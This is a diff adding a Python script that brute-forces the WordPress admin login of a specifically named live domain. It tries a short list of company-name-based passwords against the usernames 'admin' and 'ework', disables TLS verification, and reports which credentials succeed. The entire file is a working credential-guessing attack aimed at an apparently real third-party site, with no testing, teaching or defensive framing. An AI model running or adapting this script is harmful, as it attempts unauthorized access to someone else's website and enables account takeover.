@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+passwords = [
+    'Lc8095!$',
+    'Lyftcapital1!$',
+    'Lc8095!',
+    'Lc8095$$',
+    'Lyftcapital!',
+    'Lyftcapital$$'
+]
+
+users = ['admin', 'ework']
+
+url = 'https://lyftcapital.com/wp-login.php'
+
+for user in users:
+    for password in passwords:
+        # Get cookies first
+        s = requests.Session()
+        s.get(url, verify=False)
+
+        # Attempt login
+        data = {
+            'log': user,
+            'pwd': password,
+            'wp-submit': 'Log In',
+            'testcookie': '1'
+        }
+
+        r = s.post(url, data=data, verify=False, allow_redirects=True)
+
+        if 'dashboard' in r.text.lower() or 'wp-admin' in r.url:
+            print(f"[SUCCESS] {user}:{password}")
+            break
+        else:
+            print(f"[FAILED] {user}:{password}")
